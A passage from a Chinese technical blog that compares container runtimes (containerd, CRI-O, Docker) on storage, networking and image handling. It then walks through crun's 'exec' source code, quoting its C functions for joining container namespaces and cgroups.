长度大于 0，则会按照 Mounts 声明的挂载方式，使用 overlay、aufs 等联合文件系统将所有子文件夹组成容器运行需要的 rootfs，结合 OCI spec 调用低级运行时运行容器进程并将结果返回给 containerd 进程。 使用 shim 进程管理容器进程好处很多，containerd clash，containerd-shim 进程和容器进程不会受影响，containerd 恢复后只需读取运行目录的 socket 文件及 pid 恢复与 shim 进程通信即可快速还原 Tasks 信息（Unix 平台），同一容器进程出现问题，对于其他进程来说是隔离。最重要的是，通过统一的 shim 接口，同一套 containerd 代码可以同时兼容多个不同的运行时，也能同时兼容不同操作系统平台。 containerd 不提供容器网络和容器应用状态存储解决方案，而是把它们留给了更高层的实现。 container 在其 介绍 中提到：其设计目的是成为大系统中的一个组件（如 Kubernetes, Docker)，而非直接供用户使用。 containerd is designed to be embedded into a larger system, rather than being used directly by developers or end-users。 下文会展示这意味着什么。 CRI-O相比 containerd，CRI-O 的高级运行时功能基于若干开源库实现，不同模块之间为纯粹 Go 语言依赖，而非通信协议： containers&#x2F;image 库用于 Image 下载，下载过程类似 2 阶段提交。不同来源的镜像（如 Docker, Openshift, OCI）先被统一为 ImageSource 通用抽象，接着被分为 3 部分进行处理：blob 被放置在系统临时文件夹，manifest 和 signature 缓存在内存（Put*）。之后，镜像内容 Commit 至 containers&#x2F;storage 库。 CRI-O 大部分业务逻辑集中在 containers&#x2F;storage 之上 LayerStore 接口统一处理 image layer（不包括 config layer） 和 fs layer，镜像 Commit 存储时，LayerStore 先调用 fs 驱动实现（如 overlay）在磁盘创建 fs layer 目录并记录层次关系，接着调用 ApplyDiff 方法，解压内容被存放在 layer 目录（经驱动实现），未解压内容被存放在 image layer 目录，fs layer 层次关系存储在 json 文件。 ImageStore 接口处理 image meta，包括 manifest、config 和 signature，meta 与 layer 关联索引存储在 json 文件。 ContainerStore 接口管理 container meta，创建 container 的步骤和存储 image layer 代码路径近乎重合，只不过前者被限制为 read 模式，后者为 readWrite，且没有 ApplyDiff（diff 送空），meta 与 layer 关联索引也存储在 json 文件。 containers&#x2F;storage 库 container meta 没有 namespace 概念，但提供一个 metadata 字段（string 类型）可以存储任意内容，CRI-O 便是将包括 namespace 在内的业务信息序列化为 json string 存储其中。 CRI-O 运行容器进程时，先确保对应 image 存在（不存在则尝试下载），随之基于 image top layer 创建 UnionFS，同时生成 OCI spec config.json，之后，根据请求方提供的低级运行时信息（RuntimeHandler），使用不同包装实现操作容器进程。 如果 RuntimeHandler 为非 VM 类型，创建并委托监视进程 conmon 操作低级运行时创建容器。之后，conmon 在特定路径提供一个可与容器进程通信的 socket 文件，并负责持续监视容器进程并负责将其 stream 写入指定日志文件。容器进程创建成功之后，CRI-O 直接与低级运行时交互执行 start、delete、update 等操作，或者通过 socket 文件直接与容器进程交互。 如果 RuntimeHandler 为 VM，则创建并委托 containerd-shim 进程处理间接容器进程（请求包含完整 rootfs，Mounts 为 空）。与非 VM 类型不同，此后所有容器进程相关操作均通过 shim 完成。 CRI-O 依靠 CNI 插件（默认路径 &#x2F;opt&#x2F;cni&#x2F;bin）为容器进程提供网络实现。其逻辑一般在低级运行时创建完隔离进程返回后，获取 pid 后将对应的 network namespace path（&#x2F;proc&#x2F;{pid}&#x2F;ns&#x2F;net）交给 CNI 处理，CNI 会根据配置会往对应 namespace 添加好网卡。一般地，容器进程会在 cni 网桥上获得一个独立 IP 地址，这个 IP 地址能与宿主机通信，如果 CNI 配置了 flannel 之类的 overlay 实现，容器甚至能够与其他主机的同一网段容器进程通信，具体视配置而定。细节方面可以参考 这篇介绍。 如果指定由其管理 network namespace 生命周期（配置 manage_ns_lifecycle），则会在创建 sandbox 容器时采用类似 理解 OCI#给 runC 容器绑定虚拟网卡 的方式创建虚拟网卡，随后通过 OCI json config 传递对应路径给低级运行时。同样地，当 sandbox 容器销毁时，CRI-O 会自动回收对应 namespace 资源。这部分逻辑的网络相关代码使用 C 语言实现，在 CRI-O 中以名为 pinns 的二进制程序发行。 需要指出的是，CRI-O 使用文件挂载方式配置容器 hostname, dns server 等，而非 CNI 插件。 DockerDocker 是一个大而完备的高级运行时，其用户端核心叫做 Docker Engine，由 3 部分构成：Docker Server (docker daemon, 简称 dockerd)、REST API 和 Docker cli。借助 Docker Engine 既能便捷地运行容器进程进行集成开发、也能快速构建分发镜像。 如上图所示，Docker Engine 的核心是 dockerd，既驱动镜像的构建分发，也为容器运行提供成熟的持久实现和网络实现。Docker cli 使用 REST API 与 dockerd 交互。 与上文其他运行时不同，dockerd 以 image config 为核心，使用 config layer 的 sha256 hash 值索引 image 抽象，而不是 manifest。实际上，dockerd 根本不存储 manifest。dockerd 也不存储 image layers（tar, tar.gz 等)，而只存储解压后的 layer fs 和一些必要的索引。 镜像下载时，dockerd 先自 registry 获取 manifest 文件，随后并行下载存储 image layers 和 config layer。与 containers&#x2F;storag 类似，image layer 解压内容由 fs 驱动实现（如 overlay) 存储至新建的子目录中（如 &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;{new-dir}），不同的是，随后 dockerd 只是以 layer chainID 为索引，存储 fs new-dir、diffID、parent chainID、size 等必要信息，并不存储未解压 tar 或 tar.gz。image layers 和 config layer 均存储完成后，再以 image reference 为索引，建立 reference 至 image ID 映射。作为镜像分发模块的一部分，dockerd 还会以 manifest layer digest 为索引，建立 digest 至 diffID 映射；以 diffID 为索引，建立 diffID 至 repository 和 digest 映射。 镜像推送不过是镜像下载的逆过程。dockerd 先使用 reference 获取 imageID（也即 image config），随后以 imageID 为中心组织出目标 manifest，对应的 layer fs 开始被压缩成目标格式（一般是 tar.gz）。layers 开始上传时，自分发模块获取 diffID 至 repository 和 digest 信息，发起远程请求确认对应 layer 是否已存在，存在则跳过上传，最终以 manifest 为中心的镜像被分发至对应 Registry 实现。 Docker Engine 配套了成熟的镜像构建技术，它使得开发者只需提供一个目录、一份 Dockerfile，外加一行 docker build 命令即可构建镜像。简单来看，镜像构建过程即是把应用依赖的文件系统和运行环境转化为 image layers 和 config 的过程，构建结果是能够索引到构建结果的 reference，即我们熟悉的 tag。但简单的接口后面隐藏着非常多的考量，比如怎样提高镜像构建速度，比如怎样检查构建期错误。我们已经知道一份镜像包含多份 layers，基于什么镜像构建新镜像就会在之前的 layers 上构建新 layers。实际上，dockerd 会将 Dockerfile 中的每一行命令转化为一个构建子步骤，每执行一步，都可能产生中间镜像和中间容器。COPY, ADD 等文件传输命令一般直接产生中间镜像，RUN、ENV、EXPOSE 等运行命令会产生中间容器。每成功一步，该步骤产生的中间镜像或者 config 就会成为下一步的基础，产生的中间容器随之被移除，产生的中间镜像会被保存供后续复用。构建结束时，最后一步产生的镜像会被关联到 tag（如果指定了）。dockerd 维护了镜像构建过程产生的 parent-child 关系，使用 docker image ls 命令罗列镜像时，没有 tag 且存在 child 的镜像会被过滤，如此便过滤了中间镜像。此外，docker cli 会将中间结果输出到控制台，这样如果构建出错，用户可以利用间镜像和中间容器排查问题。 Docker 容器创建运行相较 containerd 和 CRI-O 有更多高层的存储和网络抽象，如使用 -v,--volume 命令即可声明运行时需挂载的文件系统，使用 -p,--publish 即可声明 host 网络至容器网络映射，这些声明信息会被持久在 docker 工作目录下的 containers 子目录。 执行运行命令之际，dockerd 首先生成容器读写层并通过 UnionFS 与 fs layers 一道转化为 rootfs。接着，image config 中的环境、启动参数等信息被转化为 OCI runtime spec 参数。同时类似 CRI-O，dockerd 会为容器生成一些特殊的文件，如 &#x2F;etc&#x2F;hosts, &#x2F;etc&#x2F;hostname, &#x2F;etc&#x2F;resolv.conf, &#x2F;dev&#x2F;shim 等，随之这些特殊文件与 volume 声明或者 mount 声明一起作为 dockerd Mount 抽象转化为 OCI runtime spec Mount 参数。最后，rootfs、OCI runtime spec 和低级运行时信息通过 RPC 请求传递给 containerd，剧情变得和 containerd 运行容器一致。 不难发现，虽然持久挂载驱动各异，但对运行时而言，本质都是将宿主机某类型的文件目录映射到容器文件系统中。因此对于低级运行时而言，挂载逻辑可以统一。dockerd 在此之上发展了丰富的持久业务层，以便于用户使用。mount 用于直接将宿主机目录挂载至容器文件系统；volume 相对 bind mounts 优势是对应文件持久在 dockerd 的工作目录，由 dockerd 管理，同时具有跨平台能力。tmpfs 则由操作系统提供容器读写层之外的临时存储能力。 dockerd 支持多种网络驱动，其基础抽象叫做 endpoint，可以简单将 endpoint 理解为网卡背后的网络资源。对于每一 endpoint，dockerd 都会通过 IPAM 实现在 docker0 网桥上分配 IP 地址，接着通过 bridge 等驱动为容器创建网卡，如果使用 publish 参数配置了容器至宿主机的 port 映射，dockerd 会往宿主机 iptable 添加对应网络规则，同时还可能会启动 docker proxy 服务 forward 流量到容器。容器的所有 endpoints 被放置在 sandbox 抽象中。准备好网络资源后，dockerd 调用 containerd 运行容器时，会在 OCI spec 中设置 Prestart Hook 命令，该命令包含了设置网络的必要信息（容器ID，容器进程ID，sandbox ID）。低级运行时实现如 runC 会在容器进程被创建但未被运行前调用该命令，该命令最终将容器ID，容器进程ID，sandbox ID 传递给 dockerd，dockerd 随即将 sandbox 中的所有 endpoint 资源绑定到容器网络 namespace 中（也是 &#x2F;proc&#x2F;{ctr-pid}&#x2F;ns&#x2F;net）。 参考资料什么是容器运行时 container runtime-fbwd-ChinaUnix博客 容器运行时的综合比较 (zhangjiee.com) 各种容器运行时都解决了什么问题 - ZengXu’s BLOG What are container runtimes? | Opensource.com — 什么是容器运行时？ |开源网站 理解 OCI containerd, containerd-CRI CRI-O Docker, Docker Networking overview, Docker Storage overview, buildkit, libnetwork","categories":[{"name":"容器","slug":"容器","permalink":"http://example.com/categories/%E5%AE%B9%E5%99%A8/"}],"tags":[]},{"title":"crun exec 源码分析","slug":"crun-exec-源码分析","date":"2023-12-25T08:48:09.000Z","updated":"2023-12-26T02:59:27.642Z","comments":true,"path":"2023/12/25/crun-exec-源码分析/","link":"","permalink":"http://example.com/2023/12/25/crun-exec-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"containers&#x2F;crun at f987a57226eb8d6795920ee213a91be0ebe2a161 (github.com) 入口crun&#x2F;src&#x2F;crun.c at main · containers&#x2F;crun (github.com)","text":"containers&#x2F;crun at f987a57226eb8d6795920ee213a91be0ebe2a161 (github.com) 入口crun&#x2F;src&#x2F;crun.c at main · containers&#x2F;crun (github.com) 1234567891011121314struct commands_s commands[] = &#123; &#123; COMMAND_CREATE, &quot;create&quot;, crun_command_create &#125;, &#123; COMMAND_DELETE, &quot;delete&quot;, crun_command_delete &#125;, &#123; COMMAND_EXEC, &quot;exec&quot;, crun_command_exec &#125;, &#123; COMMAND_LIST, &quot;list&quot;, crun_command_list &#125;, &#123; COMMAND_KILL, &quot;kill&quot;, crun_command_kill &#125;, &#123; COMMAND_PS, &quot;ps&quot;, crun_command_ps &#125;, &#123; COMMAND_RUN, &quot;run&quot;, crun_command_run &#125;, &#123; COMMAND_SPEC, &quot;spec&quot;, crun_command_spec &#125;, &#123; COMMAND_START, &quot;start&quot;, crun_command_start &#125;, &#123; COMMAND_STATE, &quot;state&quot;, crun_command_state &#125;, &#123; COMMAND_UPDATE, &quot;update&quot;, crun_command_update &#125;, &#123; COMMAND_PAUSE, &quot;pause&quot;, crun_command_pause &#125;, &#123; COMMAND_UNPAUSE, &quot;resume&quot;, crun_command_unpause &#125;, &#123; COMMAND_FEATURES, &quot;features&quot;, crun_command_features &#125;, 进入实际执行exec命令的函数 crun_command_execcrun&#x2F;src&#x2F;exec.c at f987a57226eb8d6795920ee213a91be0ebe2a161 · containers&#x2F;crun (github.com) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394intcrun_command_exec (struct crun_global_arguments *global_args, int argc, char **argv, libcrun_error_t *err)&#123; int first_arg = 0, ret = 0; libcrun_context_t crun_context = &#123; 0, &#125;; cleanup_process_schema runtime_spec_schema_config_schema_process *process = NULL; struct libcrun_container_exec_options_s exec_opts; memset (&amp;exec_opts, 0, sizeof (exec_opts)); exec_opts.struct_size = sizeof (exec_opts); crun_context.preserve_fds = 0; crun_context.listen_fds = 0; argp_parse (&amp;run_argp, argc, argv, ARGP_IN_ORDER, &amp;first_arg, &amp;exec_options); crun_assert_n_args (argc - first_arg, exec_options.process ? 1 : 2, -1); ret = init_libcrun_context (&amp;crun_context, argv[first_arg], global_args, err); if (UNLIKELY (ret &lt; 0)) return ret; crun_context.detach = exec_options.detach; crun_context.console_socket = exec_options.console_socket; crun_context.pid_file = exec_options.pid_file; crun_context.preserve_fds = exec_options.preserve_fds; if (getenv (&quot;LISTEN_FDS&quot;)) &#123; crun_context.listen_fds = strtoll (getenv (&quot;LISTEN_FDS&quot;), NULL, 10); crun_context.preserve_fds += crun_context.listen_fds; &#125; if (exec_options.process) exec_opts.path = exec_options.process; else &#123; process = xmalloc0 (sizeof (*process)); int i; process-&gt;args_len = argc; process-&gt;args = xmalloc0 ((argc + 1) * sizeof (*process-&gt;args)); for (i = 0; i &lt; argc - first_arg; i++) process-&gt;args[i] = xstrdup (argv[first_arg + i + 1]); process-&gt;args[i] = NULL; if (exec_options.cwd) process-&gt;cwd = exec_options.cwd; process-&gt;terminal = exec_options.tty; process-&gt;env = exec_options.env; process-&gt;env_len = exec_options.env_size; process-&gt;user = make_oci_process_user (exec_options.user); if (exec_options.process_label != NULL) process-&gt;selinux_label = xstrdup (exec_options.process_label); if (exec_options.apparmor != NULL) process-&gt;apparmor_profile = xstrdup (exec_options.apparmor); if (exec_options.cap_size &gt; 0) &#123; runtime_spec_schema_config_schema_process_capabilities *capabilities = xmalloc (sizeof (runtime_spec_schema_config_schema_process_capabilities)); capabilities-&gt;effective = exec_options.cap; capabilities-&gt;effective_len = exec_options.cap_size; capabilities-&gt;inheritable = NULL; capabilities-&gt;inheritable_len = 0; capabilities-&gt;bounding = dup_array (exec_options.cap, exec_options.cap_size); capabilities-&gt;bounding_len = exec_options.cap_size; capabilities-&gt;ambient = dup_array (exec_options.cap, exec_options.cap_size); capabilities-&gt;ambient_len = exec_options.cap_size; capabilities-&gt;permitted = dup_array (exec_options.cap, exec_options.cap_size); capabilities-&gt;permitted_len = exec_options.cap_size; process-&gt;capabilities = capabilities; &#125; // noNewPriviledges will remain `false` if basespec has `false` unless specified // Default is always `true` in generated basespec config if (exec_options.no_new_privs) process-&gt;no_new_privileges = 1; exec_opts.process = process; &#125; exec_opts.cgroup = exec_options.cgroup; return libcrun_container_exec_with_options (&amp;crun_context, argv[first_arg], &amp;exec_opts, err);&#125; 进入libcrun_container_exec_with_options libcrun_container_exec_with_optionscrun&#x2F;src&#x2F;libcrun&#x2F;container.c at main · containers&#x2F;crun (github.com) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264intlibcrun_container_exec_with_options (libcrun_context_t *context, const char *id, struct libcrun_container_exec_options_s *opts, libcrun_error_t *err)&#123; cleanup_custom_handler_instance struct custom_handler_instance_s *custom_handler = NULL; int container_status, ret; bool container_paused = false; pid_t pid; libcrun_container_status_t status = &#123;&#125;; const char *state_root = context-&gt;state_root; cleanup_close int terminal_fd = -1; cleanup_close int seccomp_fd = -1; cleanup_terminal void *orig_terminal = NULL; cleanup_free char *config_file = NULL; cleanup_container libcrun_container_t *container = NULL; cleanup_free char *dir = NULL; int container_ret_status[2]; cleanup_close int pipefd0 = -1; cleanup_close int pipefd1 = -1; cleanup_close int seccomp_receiver_fd = -1; cleanup_close int own_seccomp_receiver_fd = -1; cleanup_close int seccomp_notify_fd = -1; const char *seccomp_notify_plugins = NULL; __attribute__ ((unused)) cleanup_process_schema runtime_spec_schema_config_schema_process *process_cleanup = NULL; runtime_spec_schema_config_schema_process *process = opts-&gt;process; struct libcrun_seccomp_gen_ctx_s seccomp_gen_ctx; char b; ret = libcrun_read_container_status (&amp;status, state_root, id, err); if (UNLIKELY (ret &lt; 0)) return ret; ret = libcrun_is_container_running (&amp;status, err); if (UNLIKELY (ret &lt; 0)) return ret; container_status = ret; dir = libcrun_get_state_directory (state_root, id); if (UNLIKELY (dir == NULL)) return crun_make_error (err, 0, &quot;cannot get state directory&quot;); ret = append_paths (&amp;config_file, err, dir, &quot;config.json&quot;, NULL); if (UNLIKELY (ret &lt; 0)) return ret; container = libcrun_container_load_from_file (config_file, err); if (container == NULL) return crun_make_error (err, 0, &quot;error loading config.json&quot;); container-&gt;context = context; if (container_status == 0) return crun_make_error (err, 0, &quot;the container `%s` is not running&quot;, id); &#123; cleanup_cgroup_status struct libcrun_cgroup_status *cgroup_status = NULL; cgroup_status = libcrun_cgroup_make_status (&amp;status); ret = libcrun_cgroup_is_container_paused (cgroup_status, &amp;container_paused, err); if (UNLIKELY (ret &lt; 0)) return ret; &#125; if (UNLIKELY (container_paused)) return crun_make_error (err, 0, &quot;the container `%s` is paused&quot;, id); ret = libcrun_configure_handler (context-&gt;handler_manager, context, container, &amp;custom_handler, err); if (UNLIKELY (ret &lt; 0)) return ret; ret = block_signals (err); if (UNLIKELY (ret &lt; 0)) return ret; libcrun_seccomp_gen_ctx_init (&amp;seccomp_gen_ctx, container, false, 0); ret = libcrun_open_seccomp_bpf (&amp;seccomp_gen_ctx, &amp;seccomp_fd, err); if (UNLIKELY (ret &lt; 0)) return ret; if (seccomp_fd &gt;= 0) &#123; ret = get_seccomp_receiver_fd (container, &amp;seccomp_receiver_fd, &amp;own_seccomp_receiver_fd, &amp;seccomp_notify_plugins, err); if (UNLIKELY (ret &lt; 0)) return ret; &#125; if (sizeof (*opts) != opts-&gt;struct_size) return crun_make_error (err, EINVAL, &quot;invalid libcrun_container_exec_options_s struct&quot;); if (opts-&gt;path) &#123; struct parser_context ctx = &#123; 0, stderr &#125;; cleanup_free char *content = NULL; parser_error parser_err = NULL; yajl_val tree = NULL; size_t len; if (process) return crun_make_error (err, EINVAL, &quot;cannot specify both exec file and options&quot;); ret = read_all_file (opts-&gt;path, &amp;content, &amp;len, err); if (UNLIKELY (ret &lt; 0)) return ret; ret = parse_json_file (&amp;tree, content, &amp;ctx, err); if (UNLIKELY (ret &lt; 0)) return ret; process = make_runtime_spec_schema_config_schema_process (tree, &amp;ctx, &amp;parser_err); if (UNLIKELY (process == NULL)) &#123; ret = crun_make_error (err, errno, &quot;cannot parse process file: `%s`&quot;, parser_err); free (parser_err); if (tree) yajl_tree_free (tree); return ret; &#125; free (parser_err); if (tree) yajl_tree_free (tree); process_cleanup = process; &#125; /* This must be done before we enter a user namespace. */ ret = libcrun_set_rlimits (process-&gt;rlimits, process-&gt;rlimits_len, err); if (UNLIKELY (ret &lt; 0)) return ret; ret = pipe2 (container_ret_status, O_CLOEXEC); if (UNLIKELY (ret &lt; 0)) return crun_make_error (err, errno, &quot;pipe&quot;); pipefd0 = container_ret_status[0]; pipefd1 = container_ret_status[1]; /* If the new process block doesn&#x27;t specify a SELinux label or AppArmor profile, then use the configuration from the original config file. */ if (container-&gt;container_def-&gt;process) &#123; if (process-&gt;selinux_label == NULL &amp;&amp; container-&gt;container_def-&gt;process-&gt;selinux_label) process-&gt;selinux_label = xstrdup (container-&gt;container_def-&gt;process-&gt;selinux_label); if (process-&gt;apparmor_profile == NULL &amp;&amp; container-&gt;container_def-&gt;process-&gt;apparmor_profile) process-&gt;apparmor_profile = xstrdup (container-&gt;container_def-&gt;process-&gt;apparmor_profile); &#125; ret = initialize_security (process, err); if (UNLIKELY (ret &lt; 0)) return ret; ret = prctl (PR_SET_DUMPABLE, 0, 0, 0, 0); if (UNLIKELY (ret &lt; 0)) return crun_make_error (err, errno, &quot;prctl (PR_SET_DUMPABLE)&quot;); pid = libcrun_join_process (context, container, status.pid, &amp;status, opts-&gt;cgroup, context-&gt;detach, process, process-&gt;terminal ? &amp;terminal_fd : NULL, err); if (UNLIKELY (pid &lt; 0)) return pid; /* Process to exec. */ if (pid == 0) &#123; TEMP_FAILURE_RETRY (close (pipefd0)); pipefd0 = -1; exec_process_entrypoint (context, container, process, pipefd1, seccomp_fd, seccomp_receiver_fd, custom_handler, err); /* It gets here only on errors. */ if (*err) libcrun_fail_with_error ((*err)-&gt;status, &quot;%s&quot;, (*err)-&gt;msg); _exit (EXIT_FAILURE); &#125; TEMP_FAILURE_RETRY (close (pipefd1)); pipefd1 = -1; TEMP_FAILURE_RETRY (write (pipefd0, &amp;pid, sizeof (pid))); if (seccomp_fd &gt;= 0) close_and_reset (&amp;seccomp_fd); if (terminal_fd &gt;= 0) &#123; unsigned short rows = 0, cols = 0; if (process-&gt;console_size) &#123; cols = process-&gt;console_size-&gt;width; rows = process-&gt;console_size-&gt;height; &#125; ret = libcrun_terminal_setup_size (terminal_fd, rows, cols, err); if (UNLIKELY (ret &lt; 0)) return ret; if (context-&gt;console_socket) &#123; int ret; cleanup_close int console_socket_fd = open_unix_domain_client_socket (context-&gt;console_socket, 0, err); if (UNLIKELY (console_socket_fd &lt; 0)) return console_socket_fd; ret = send_fd_to_socket (console_socket_fd, terminal_fd, err); if (UNLIKELY (ret &lt; 0)) return ret; close_and_reset (&amp;terminal_fd); &#125; else &#123; ret = libcrun_setup_terminal_ptmx (terminal_fd, &amp;orig_terminal, err); if (UNLIKELY (ret &lt; 0)) &#123; flush_fd_to_err (context, terminal_fd); return ret; &#125; &#125; &#125; ret = TEMP_FAILURE_RETRY (read (pipefd0, &amp;b, sizeof (b))); TEMP_FAILURE_RETRY (close (pipefd0)); pipefd0 = -1; if (ret != 1 || b != &#x27;0&#x27;) ret = -1; else &#123; /* Let&#x27;s receive the seccomp notify fd and handle it as part of wait_for_process(). */ if (own_seccomp_receiver_fd &gt;= 0) &#123; seccomp_notify_fd = receive_fd_from_socket (own_seccomp_receiver_fd, err); if (UNLIKELY (seccomp_notify_fd &lt; 0)) return seccomp_notify_fd; ret = close_and_reset (&amp;own_seccomp_receiver_fd); if (UNLIKELY (ret &lt; 0)) return ret; &#125; &#123; struct wait_for_process_args args = &#123; .pid = pid, .context = context, .terminal_fd = terminal_fd, .notify_socket = -1, .container_ready_fd = NULL, .seccomp_notify_fd = seccomp_notify_fd, .seccomp_notify_plugins = seccomp_notify_plugins, &#125;; ret = wait_for_process (&amp;args, err); &#125; &#125; flush_fd_to_err (context, terminal_fd); return ret;&#125; 在libcrun_join_process中进行加入namespace操作 libcrun_join_processcrun&#x2F;src&#x2F;libcrun&#x2F;linux.c at main · containers&#x2F;crun (github.com) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184intlibcrun_join_process (libcrun_context_t *context, libcrun_container_t *container, pid_t pid_to_join, libcrun_container_status_t *status, const char *sub_cgroup, int detach, runtime_spec_schema_config_schema_process *process, int *terminal_fd, libcrun_error_t *err)&#123; pid_t pid; int ret; int sync_socket_fd[2]; cleanup_close int cgroup_dirfd = -1; cleanup_close int sync_fd = -1; struct _clone3_args clone3_args; bool need_move_to_cgroup; if (! detach) &#123; ret = prctl (PR_SET_CHILD_SUBREAPER, 1, 0, 0, 0); if (UNLIKELY (ret &lt; 0)) return crun_make_error (err, errno, &quot;set child subreaper&quot;); &#125; ret = socketpair (AF_UNIX, SOCK_SEQPACKET | SOCK_CLOEXEC, 0, sync_socket_fd); if (UNLIKELY (ret &lt; 0)) return crun_make_error (err, errno, &quot;error creating socketpair&quot;); &#123; cleanup_cgroup_status struct libcrun_cgroup_status *cgroup_status = NULL; cgroup_status = libcrun_cgroup_make_status (status); /* The cgroup can be joined directly only when there are no additional controllers not handled by cgroup v2. */ if (get_force_cgroup_v1_annotation (container) == NULL) &#123; cgroup_dirfd = libcrun_get_cgroup_dirfd (cgroup_status, sub_cgroup, err); if (UNLIKELY (cgroup_dirfd &lt; 0)) crun_error_release (err); &#125; &#125; memset (&amp;clone3_args, 0, sizeof (clone3_args)); clone3_args.exit_signal = SIGCHLD; if (cgroup_dirfd &lt; 0) need_move_to_cgroup = true; else &#123; need_move_to_cgroup = false; clone3_args.flags |= CLONE_INTO_CGROUP; clone3_args.cgroup = cgroup_dirfd; &#125; pid = syscall_clone3 (&amp;clone3_args); if (pid &gt; 0) &#123; /* We need to set the scheduler as soon as possible after joining the cgroup, because if it is a RT scheduler, other processes in the container could already take the entire cpu time and stall the new process. */ ret = libcrun_set_scheduler (pid, process, err); if (UNLIKELY (ret &lt; 0)) return ret; &#125; /* On errors, fall back to fork(). */ if (pid &lt; 0) &#123; need_move_to_cgroup = true; pid = fork (); if (UNLIKELY (pid &lt; 0)) &#123; ret = crun_make_error (err, errno, &quot;fork&quot;); goto exit; &#125; &#125; if (pid) &#123; close_and_reset (&amp;sync_socket_fd[1]); sync_fd = sync_socket_fd[0]; return join_process_parent_helper (context, container, process, pid, sync_fd, status, need_move_to_cgroup, sub_cgroup, terminal_fd, err); &#125; close_and_reset (&amp;sync_socket_fd[0]); sync_fd = sync_socket_fd[1]; ret = join_process_namespaces (container, pid_to_join, status, err); if (UNLIKELY (ret &lt; 0)) &#123; TEMP_FAILURE_RETRY (write (sync_fd, &quot;1&quot;, 1)); libcrun_fail_with_error ((*err)-&gt;status, &quot;%s&quot;, (*err)-&gt;msg); &#125; if (setsid () &lt; 0) &#123; int saved_errno = errno; TEMP_FAILURE_RETRY (write (sync_fd, &quot;1&quot;, 1)); libcrun_fail_with_error (saved_errno, &quot;setsid&quot;); &#125; /* We need to fork once again to join the PID namespace. */ pid = fork (); if (UNLIKELY (pid &lt; 0)) &#123; int saved_errno = errno; TEMP_FAILURE_RETRY (write (sync_fd, &quot;1&quot;, 1)); libcrun_fail_with_error (saved_errno, &quot;fork&quot;); &#125; if (pid) &#123; /* Just return the PID to the parent helper and exit. */ ret = TEMP_FAILURE_RETRY (write (sync_fd, &quot;0&quot;, 1)); if (UNLIKELY (ret &lt; 0)) &#123; kill (pid, SIGKILL); _exit (EXIT_FAILURE); &#125; ret = TEMP_FAILURE_RETRY (write (sync_fd, &amp;pid, sizeof (pid))); if (UNLIKELY (ret &lt; 0)) &#123; kill (pid, SIGKILL); _exit (EXIT_FAILURE); &#125; _exit (EXIT_SUCCESS); &#125; else &#123; /* Inside the grandchild process. The real process used for the container. */ cleanup_free char *pty = NULL; int r = -1; ret = TEMP_FAILURE_RETRY (read (sync_fd, &amp;r, sizeof (r))); if (UNLIKELY (ret &lt; 0)) _exit (EXIT_FAILURE); if (terminal_fd) &#123; cleanup_close int ptmx_fd = -1; ret = setsid (); if (ret &lt; 0) &#123; crun_make_error (err, errno, &quot;setsid&quot;); send_error_to_sync_socket_and_die (sync_fd, true, err); &#125; ret = set_id_init (container, err); if (UNLIKELY (ret &lt; 0)) send_error_to_sync_socket_and_die (sync_fd, true, err); ptmx_fd = open_terminal (&amp;pty, process, err); if (UNLIKELY (ptmx_fd &lt; 0)) send_error_to_sync_socket_and_die (sync_fd, true, err); ret = send_fd_to_socket (sync_fd, ptmx_fd, err); if (UNLIKELY (ret &lt; 0)) send_error_to_sync_socket_and_die (sync_fd, true, err); &#125; if (r &lt; 0) _exit (EXIT_FAILURE); &#125; return 0;exit: if (sync_socket_fd[0] &gt;= 0) TEMP_FAILURE_RETRY (close (sync_socket_fd[0])); if (sync_socket_fd[1] &gt;= 0) TEMP_FAILURE_RETRY (close (sync_socket_fd[1])); return ret;&#125; join_process_namespacescrun&#x2F;src&#x2F;libcrun&#x2F;linux.c at main · containers&#x2F;crun (github.com) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899static intjoin_process_namespaces (libcrun_container_t *container, pid_t pid_to_join, libcrun_container_status_t *status, libcrun_error_t *err)&#123; runtime_spec_schema_config_schema *def = container-&gt;container_def; int fds_joined[MAX_NAMESPACES] = &#123; 0, &#125;; int fds[MAX_NAMESPACES] = &#123; -1, &#125;; size_t i; int ret; /* Try to join all namespaces in one shot with setns and pidfd. */ ret = try_setns_with_pidfd (pid_to_join, container, status, err); if (UNLIKELY (ret &lt; 0)) return ret; /* Nothing left to do if the namespaces were joined. */ if (LIKELY (ret &gt; 0)) return 0; /* If setns fails with the target pidfd, fall-back to join each namespace individually. */ if (def-&gt;linux-&gt;namespaces_len &gt;= MAX_NAMESPACES) return crun_make_error (err, 0, &quot;invalid configuration&quot;); for (i = 0; namespaces[i].ns_file; i++) &#123; cleanup_free char *ns_join = NULL; xasprintf (&amp;ns_join, &quot;/proc/%d/ns/%s&quot;, pid_to_join, namespaces[i].ns_file); fds[i] = open (ns_join, O_RDONLY | O_CLOEXEC); if (UNLIKELY (fds[i] &lt; 0)) &#123; /* If the namespace doesn&#x27;t exist, just ignore it. */ if (errno == ENOENT) continue; ret = crun_make_error (err, errno, &quot;open `%s`&quot;, ns_join); goto exit; &#125; &#125; for (i = 0; namespaces[i].ns_file; i++) &#123; if (namespaces[i].value == CLONE_NEWUSER) continue; ret = setns (fds[i], 0); if (ret == 0) fds_joined[i] = 1; &#125; for (i = 0; namespaces[i].ns_file; i++) &#123; if (fds_joined[i]) continue; ret = setns (fds[i], 0); if (ret == 0) fds_joined[i] = 1; &#125; for (i = 0; namespaces[i].ns_file; i++) &#123; if (fds_joined[i]) continue; ret = setns (fds[i], 0); if (UNLIKELY (ret &lt; 0 &amp;&amp; errno != EINVAL)) &#123; size_t j; bool found = false; for 